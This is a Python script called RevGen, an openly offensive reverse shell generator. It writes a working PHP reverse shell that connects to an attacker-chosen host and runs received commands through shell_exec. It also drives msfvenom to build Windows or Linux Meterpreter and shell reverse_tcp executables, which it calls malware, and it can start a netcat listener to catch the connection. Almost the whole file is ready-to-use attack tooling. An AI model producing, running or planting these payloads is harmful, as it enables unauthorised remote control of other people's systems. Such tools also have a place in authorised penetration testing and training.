#!/usr/bin/env python3
import os
import subprocess


def main():
    os.system('clear')
    
    # ASCII Art Placeholder
    print("""

______           _____            
| ___ \         |  __ \           
| |_/ /_____   _| |  \/ ___ _ __  
|    // _ \ \ / / | __ / _ \ '_ \ 
| |\ \  __/\ V /| |_\ \  __/ | | |
\_| \_\___| \_/  \____/\___|_| |_| 
                                  v1.0
--------------------------------------
reverse shell generator by syphonfltr                                  

    """)

    # Collect user inputs
    lhost = input("Enter your LHOST: ")
    lport = input("Enter your LPORT: ")

    # Choose between webshell or malware
    print("1. Webshell\n2. Malware")
    choice = input("Choose an option (1 or 2): ")

    if choice == '1':
        create_php_webshell(lhost, lport)
    elif choice == '2':
        create_malware(lhost, lport)
    else:
        print("Invalid choice. Exiting.")

def create_php_webshell(lhost, lport):
    php_shell = f"""<?php
$ip = '{lhost}';
$port = {lport};

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {{
    echo "Error: $errstr ($errno)\\n";
    exit(1);
}}

while (!feof($sock)) {{
    if (fgets($sock, 2) === false) {{
        break;
    }}
    $cmd = shell_exec(fgets($sock));
    fwrite($sock, $cmd);
}}

fclose($sock);
?>
    """
    with open("shelly.php", "w") as file:
        file.write(php_shell)
    print("PHP webshell created as shelly.php")

    # Ask user if they want to start a webshell listener
    start_listener = input("Do you want to start a webshell listener (y/n)? ").lower()
    if start_listener == 'y':
        os.system(f"nc -nlvp {lport}")
    else:
        print("Thanks for using RevGen!")

def create_malware(lhost, lport):
    print("1. Windows\n2. Linux")
    os_choice = input("Choose the target OS (1 or 2): ")

    print("1. Meterpreter\n2. Shell")
    payload_type = input("Choose the payload type (1 or 2): ")

    if os_choice == "1":
        payload_os = "windows"
    elif os_choice == "2":
        payload_os = "linux/x86"
    else:
        print("Invalid OS choice. Exiting.")
        return

    if payload_type == "1":
        payload_type = "meterpreter"
    elif payload_type == "2":
        payload_type = "shell"
    else:
        print("Invalid payload type. Exiting.")
        return

    file_type = "exe" if payload_os == "windows" else "elf"
    file_name = "payload.exe" if payload_os == "windows" else "payload.elf"

    msfvenom_command = [
        "msfvenom",
        "-p", f"{payload_os}/{payload_type}_reverse_tcp",
        "LHOST=" + lhost, 
        "LPORT=" + lport,
        "-f", file_type,
        "-o", file_name
    ]
    print(f"...Generating malware using {' '.join(msfvenom_command)}")

    try:
        subprocess.run(msfvenom_command, check=True)
        print(f"Malware generated and saved as {file_name}")
    except subprocess.CalledProcessError as e:
        print("An error occurred while generating malware.")
        return

    # Ask user if they want to start a listener
    start_listener = input("Do you want to start a listener (y/n)? ").lower()
    if start_listener == 'y':
        os.system(f"nc -nlvp {lport}")
    else:
        print("Thanks for using RevGen!")

if __name__ == "__main__":
    main()
